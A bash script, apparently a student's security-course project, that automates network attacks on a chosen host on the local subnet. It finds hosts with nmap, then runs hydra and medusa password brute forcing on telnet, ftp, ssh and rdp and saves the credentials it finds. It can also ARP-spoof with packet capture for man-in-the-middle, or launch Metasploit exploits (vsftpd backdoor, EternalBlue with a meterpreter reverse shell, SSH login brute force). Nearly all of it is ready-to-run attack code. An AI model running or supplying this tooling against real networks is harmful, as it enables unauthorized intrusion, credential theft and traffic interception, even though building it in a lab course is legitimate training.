#!/bin/bash
# student's name = Hod Perez
# code = s9
# class code = TMagen773632
# lecturer's name = Erel Regev

function START()
{
	initial_location=$(pwd)
	echo -e "\nplease insert the password for the user so the script could run high privileged commands:\n"
	read -s user_password
	echo -e "\n\033[1mplease insert the type of attack you want to commit:\033[0m\n1. hydra attack\n2. arpspoof attack\n3. using msfconsole to try exploit services as smb or ssh\n4. let the system choose the attack randomly for you\n"
	read option
	local_ip=$(hostname -I | awk '{print $1}')
	dhcp_ip=$(cat /var/lib/dhcp/dhclient.leases | grep dhcp-server-identifier | awk '{print $NF}' | sed 's/;//g' | uniq)
	local_ip_sunbet="$local_ip/24"
	DG_ip=$(ip route | grep default | awk '{print $3}')
	list_of_ip=$(echo "$user_password" | sudo -S nmap $local_ip_sunbet -sn 2>/dev/null | grep report | awk '{print $NF}' | grep -wvE "$DG_ip|$local_ip|$dhcp_ip")
	echo -e "\033[1mthe list of the available IP addresses on the network except of the DG and DHCP ip:\033[0m\n$list_of_ip"
	echo -e "\nplease insert the ip you want to attack\nfor random ip based on the list enter anything else\nthen the system will choose ip randomly from the list\n"
	read ip
	
	if echo "$list_of_ip" | grep -wq "$ip"
	then
		echo -e "\n\033[1musing the chosen ip $ip\033[0m"
    else
		echo -e "\n\033[1;31mentered invalid ip, choosing randomly\033[0m"
		ip=$(echo "$list_of_ip" | shuf -n 1)
		echo "\033[1mthe chosen ip is $ip\033[0m"
	fi
	
	mkdir "Attack" > /dev/null 2>&1
	cd Attack
	nmap $ip | grep open | awk '{print $3}' > "$initial_location/Attack/services.txt"
	
	CASE
	
	echo -e "the type of the attack is: $type_of_attack\nthe time the attack was executed is: $time_attack\nthe target ip is $ip" > "$initial_location/Attack/attack_log.txt"
	
}


function CASE()
{
	case $option in
	1)
		dir_name="hydra"
		echo "creating a directory called hydra if not exist"
		mkdir "$dir_name" > /dev/null 2>&1
		HYDRA_ATTACK
	;;
	
	2)
		dir_name="arpspoof"
		echo "creating a directory called arpspoof if not exist"
		mkdir "$dir_name" > /dev/null 2>&1
		ARPSPOOF_ATTACK
	;;
	
	3)
		dir_name="msfconsole"
		echo "creating a directory called msfconsole if not exist"
		mkdir "$dir_name" > /dev/null 2>&1
		MSFCONSOLE_ATTACK
	;;
	
	4)
		echo "choosing an attack randomly.."
		option=$(( (RANDOM % 3) + 1 ))
		if [ $option -eq 1 ]
		then
			echo "hydra attack was drawn"
		elif [ $option -eq 2 ]
		then
			echo "arpspoof attack was drawn"
		else
			echo "msfconsole attack was drawn"
		fi
		
		CASE
	;;
	
	*)
		echo -e "\nyou chose invalid option, exiting..."
		exit
	;;
	esac
}


ARRAY_OF_SERVICES=("ftp" "ssh" "rdp")
function HYDRA_ATTACK()
{
	time_attack=$(date)
	type_of_attack="using hydra for brute force on services"
	echo -e "\n\033[1;33mthe attack implement brute force on the target by using common credentials using hydra and medusa tools\nit also check which services are open on the target for attack them\nafter the attack it print all the credentials are found to what service\033[0m"
	cd "$initial_location/Attack/$dir_name" && git clone https://github.com/hodperez/short-list-worst-passwords.git >/dev/null 2>&1
	if grep -wq "telnet" "$initial_location/Attack/services.txt"
	then
		timeout 40 stdbuf -oL hydra -L "$initial_location/Attack/$dir_name/short-list-worst-passwords/12_worst_passwords.txt" -P "$initial_location/Attack/$dir_name/short-list-worst-passwords/12_worst_passwords.txt" $ip telnet -V -t 10 -f > "$initial_location/Attack/$dir_name/telnet.txt" 2>&1 &
		for module in "${ARRAY_OF_SERVICES[@]}"
		do
			if grep -wq "$module" "$initial_location/Attack/services.txt"
			then
				timeout 40 stdbuf -oL medusa -h "$ip" -U "$initial_location/Attack/$dir_name/short-list-worst-passwords/12_worst_passwords.txt" -P "$initial_location/Attack/$dir_name/short-list-worst-passwords/12_worst_passwords.txt" -M "$module" -t 50 -f > "$initial_location/Attack/$dir_name/$module.txt" 2>&1 &
			fi
		done
		
		wait
		
		credentials=$(grep -hE "SUCCESS|login:" *.txt)
		echo -e "\n\033[1mthe credentials were found:\033[0m\n$credentials"
		echo "$credentials" > "../credentials.txt"
		
	else
		for module in "${ARRAY_OF_SERVICES[@]}"
		do
			if grep -wq "$module" "$initial_location/Attack/services.txt"
			then
				timeout 40 stdbuf -oL medusa -h "$ip" -U "$initial_location/Attack/$dir_name/short-list-worst-passwords/12_worst_passwords.txt" -P "$initial_location/Attack/$dir_name/short-list-worst-passwords/12_worst_passwords.txt" -M "$module" -t 50 -f > "$initial_location/Attack/$dir_name/$module.txt" 2>&1 &
			fi
		done
		
		wait
		
		credentials=$(grep "SUCCESS" *.txt)
		echo -e "\n\033[1mthe credentials were found:\033[0m\n$credentials"
		echo "$credentials" > "../credentials.txt"
	fi
	
	
}

function ARPSPOOF_ATTACK()
{
	type_of_attack="arpspoof attack for be man in the middle"
	time_attack=$(date)
	echo -e "\n\033[1;33mthe attack implement arpspoof attack on the target, by sending fake arp reply to the router\nlet the router think you are the target, and send arp reply to the target, make the target think you are the router\nthis attack make you the man in the middle and let all the data pass through you\033[0m"
	cd "$initial_location"/Attack/arpspoof
	echo -e "\n\033[1;33mplease insert the amount of time (in seconds) for the arspoof attack, at least 200 seconds recommended\033[0m"
	read time
	echo "Starting packet capture..."
	tshark -i eth0 -a duration:"$time" -w arp.pcap > /dev/null 2>&1 &
	tshark_pid=$!

	sleep 5

	echo "Starting ARP spoofing..."
	sudo arpspoof -i eth0 -t $ip $DG_ip > /dev/null 2>&1 &
	arp1_pid=$!
	
	sudo arpspoof -i eth0 -t $DG_ip $ip > /dev/null 2>&1 &
	arp2_pid=$!

	sleep "$time"

	echo -e "\033[1;31mStopping ARP spoofing...\033[0m"
	sudo kill $arp1_pid $arp2_pid

	wait $tshark_pid

	echo -e "\033[1mPacket capture complete. File saved as arp.pcap.\033[0m"
}

function MSFCONSOLE_ATTACK()
{
	time_attack=$(date)
	echo -e "\n\033[1;33mthe attack use msfconsole to exploit service, or use auxiliary to help establish a session\033[0m\n"
	
	echo -e "1. for getting a session with ssh using known credentials\n2. for getting a session using ftp anonymous exploit\n3. for getting a session using smb exploit called eternalblue\n"
	read num
	MSFCONSOLE_CASE
	
}

function MSFCONSOLE_CASE()
{
	case $num in
	1)
		if ! grep -wq "ssh" "$initial_location/Attack/services.txt"
		then
			echo -e "\n" 
			echo -e "\n\033[1;33mwarning! pay attention that ssh service was not found in the scanning\033[0m"
		fi
		SSH_CASE

	;;
	
	2)
		type_of_attack="msfconsole using ftp anonymous exploit"
		
		if ! grep -wq "ftp" "$initial_location/Attack/services.txt"
		then
			echo -e "\n" 
			echo -e "\n\033[1;33mwarning! pay attention that ftp service was not found in the scanning\033[0m"
		fi
		
		msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS $ip; exploit -j"
	;;
	
	3)
		type_of_attack="msfconsole using smb eternalblue exploit"
		
		if ! grep -wq "microsoft-ds" "$initial_location/Attack/services.txt"
		then
			echo -e "\n" 
			echo -e "\n\033[1;33mwarning! pay attention that smb service was not found in the scanning\033[0m"
		fi
		
		msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $ip; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit -j"
	;;
	
	*)
		echo "you insert wrong number, exiting..."
		exit
	;;
	esac
	
}


function SSH_CASE()
{
	echo -e "\n\033[1mplease choose one of the followings:\033[0m\n1. insert user and password for connect using ssh service\n2. insert full path for users file and password for brute force on ssh service\n3. insert user and full path for passwords file for brute force on ssh service\n4. insert full path for users file and passwords file for brute force on ssh service\n"
	read number
	read -p "please enter a user or users file: " user
	read -p "please enter a password or passwords file: " password
	
	case $number in
	1)
		type_of_attack="msfconsole using ssh login attack"
		msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOST $ip; set USERNAME $user; set PASSWORD $password; exploit"
	;;
	
	2)
		type_of_attack="msfconsole using ssh login brute force attack"
		msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOST $ip; set USER_FILE $user; set PASSWORD $password; exploit"
	;;
	
	3)
		type_of_attack="msfconsole using ssh login brute force attack"
		msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOST $ip; set USERNAME $user; set PASS_FILE $password; exploit"
	;;
	
	4)
		type_of_attack="msfconsole using ssh login brute force attack"
		msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOST $ip; set USER_FILE $user; set PASS_FILE $password; exploit"
	;;
	
	*)
		echo "\033[1;31merror, exiting...\033[0m"
		exit
	;;
	esac
			
	
}



figlet "Attack and Logs"
START
